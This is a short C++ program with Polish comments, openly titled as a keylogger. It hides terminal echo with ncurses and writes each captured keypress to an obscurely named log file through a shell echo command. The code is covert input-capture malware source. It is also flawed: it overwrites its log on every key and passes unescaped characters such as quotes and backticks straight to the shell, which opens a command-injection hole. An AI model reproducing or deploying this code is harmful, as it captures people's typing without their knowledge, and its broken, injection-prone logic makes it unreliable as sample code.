#include <iostream>
#include <map>
#include <string>

#include <ncurses.h>

/*
Keylogger KL-0128

Autor: Marta Wojcik

Prosty keylogger, ktory ma zapisywac dane wprowadzane na
klawiaturze przez uzytkownika
*/

std::map<int, std::string> keys =
{
    // *** cyfry [nieparzyste] , [parzyste] ***

    {48,"0"} , {49,"1"},
    {50,"2"} , {51,"3"},
    {52,"4"} , {53,"5"},
    {54,"6"} , {55,"7"},
    {56,"8"} , {57,"9"},

    // *** litery [Duza] , [Mala] ***

    {65,"A"} , {97,"a"},
    {66,"B"} , {98,"b"},
    {67,"C"} , {99,"c"},
    {68,"D"} , {100,"d"},
    {69,"E"} , {101,"e"},
    {70,"F"} , {102,"f"},
    {71,"G"} , {103,"g"},
    {72,"H"} , {104,"h"},
    {73,"I"} , {105,"i"},
    {74,"J"} , {106,"j"},
    {75,"K"} , {107,"k"},
    {76,"L"} , {108,"l"},
    {77,"M"} , {109,"m"},
    {78,"N"} , {110,"n"},
    {79,"O"} , {111,"o"},
    {80,"P"} , {112,"p"},
    {81,"Q"} , {113,"q"},
    {82,"R"} , {114,"r"},
    {83,"S"} , {115,"s"},
    {84,"T"} , {116,"t"},
    {85,"U"} , {117,"u"},
    {86,"V"} , {118,"v"},
    {87,"W"} , {119,"w"},
    {88,"X"} , {120,"x"},
    {89,"Y"} , {121,"y"},
    {90,"Z"} , {122,"z"},

    // *** special characters ***

    // rzad numeryczny
    {96,"`"},{126,"~"},{33,"!"},{64,"@"},
    {35,"#"},{36,"$"},{37,"%"},{94,"^"},
    {38,"&"},{42,"*"},{40,"("},{41,")"},
    {45,"-"},{95,"_"},{61,"="},{43,"+"},

    // pierwszy rzad liter

    {91,"["},{123,"{"},{93,"]"},{125,"}"},{92,"\\"},{124,"|"},

    // drugi rzad liter

    {59,";"},{58,":"},{39,"'"},{34,"\""},

    // trzeci rzad liter

    {44,","},{60,"<"},{46,"."},{62,">"},{47,"/"},{63,"?"},

    // *** inne klawisze ***

    {27,"ESC"},{8,"BACKSPACE"},{9,"TAB"},{10,"ENTER"},{410,"F11"}
};

bool pressed()
{
    // Pobierz znak
    unsigned ch = getch();

    // Odrzuc brak wartosci
    if(ch != ERR)
    {
        ungetch(ch);
        return 1;
    }
    return 0;
}

int main()
{
    initscr();                  // Inicjalizacja terminala
    cbreak();                   // Wprowadzone znaki nie beda czekac na koniec linii
    noecho();                   // Wprowadzane dane nie beda wyswietlane
    nodelay(stdscr, TRUE);      // Funkcja getch nie zatrzymuje wykonywania programu
    scrollok(stdscr, TRUE);     // Przewijanie kursora do gory
    
    while(1)
    {
        if (pressed())
        {
            // Zapisz znaku do pliku
            system(std::string("echo \"" + keys[getch()] + "\" > l0663d_k37s.txt").c_str());
            refresh();
        }
    }
    
    return 0;
}
